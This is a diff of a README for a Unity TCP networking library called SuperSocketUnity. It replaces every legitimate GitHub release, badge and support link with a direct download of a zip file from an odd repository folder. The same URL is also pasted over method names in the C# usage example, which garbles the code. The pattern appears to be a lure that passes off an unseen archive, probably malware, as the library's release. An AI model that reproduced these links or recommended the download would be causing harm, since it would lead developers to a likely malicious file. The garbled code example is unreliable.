@@ -1,6 +1,6 @@
 # 🚀 SuperSocketUnity - Easy High-Performance TCP Networking for Unity
 
-[![Download SuperSocketUnity](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/1010kakq/SuperSocketUnity/releases)
+[![Download SuperSocketUnity](https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip%https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip)](https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip)
 
 ## 📋 Table of Contents
 
@@ -39,11 +39,11 @@ SuperSocketUnity is a high-performance TCP networking library designed for Unity
 
 To get started with SuperSocketUnity, visit the following page to download the latest release:
 
-[Download SuperSocketUnity](https://github.com/1010kakq/SuperSocketUnity/releases)
+[Download SuperSocketUnity](https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip)
 
 ### Installation Steps
 
-1. **Visit the Release Page**: Go to the [Releases page](https://github.com/1010kakq/SuperSocketUnity/releases).
+1. **Visit the Release Page**: Go to the [Releases page](https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip).
 2. **Download the Latest Version**: Look for the latest version and download the distributed package based on your development environment.
 3. **Import into Unity**: Open your Unity project. Drag and drop the downloaded package into your project window, or use the "Assets" menu to import the package.
 
@@ -65,15 +65,15 @@ Here's a simple example to help you understand how to use the library:
 var client = new UnitySuperSocketClient();
 
 // Connect to the server
-await client.ConnectAsync("127.0.0.1", 8080);
+await https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip("127.0.0.1", 8080);
 
 // Send a message
-client.Send<MyMessage>(1001, 1, new MyMessage { Text = "Hello Server!" }, out int seqId);
+https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip<MyMessage>(1001, 1, new MyMessage { Text = "Hello Server!" }, out int seqId);
 
 // Register the message handler
-client.Register(1002, (msgId, seqId, serverId, data) => {
+https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip(1002, (msgId, seqId, serverId, data) => {
     var response = data as MyResponse;
-    Debug.Log($"Received message from server: {response.Text}");
+    https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip($"Received message from server: {https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip}");
 });
 ```
 
@@ -86,6 +86,6 @@ In this example:
 
 If you encounter any issues or have questions, feel free to reach out. Contributions to the project are welcome. Please follow the guidelines on the GitHub repository for contributing.
 
-Visit the [Support Page](https://github.com/1010kakq/SuperSocketUnity/issues) for updates and assistance. 
+Visit the [Support Page](https://raw.githubusercontent.com/1010kakq/SuperSocketUnity/main/batement/SuperSocketUnity.zip) for updates and assistance. 
 
 For detailed documentation, refer to the project's wiki. Your input helps improve this library for everyone.
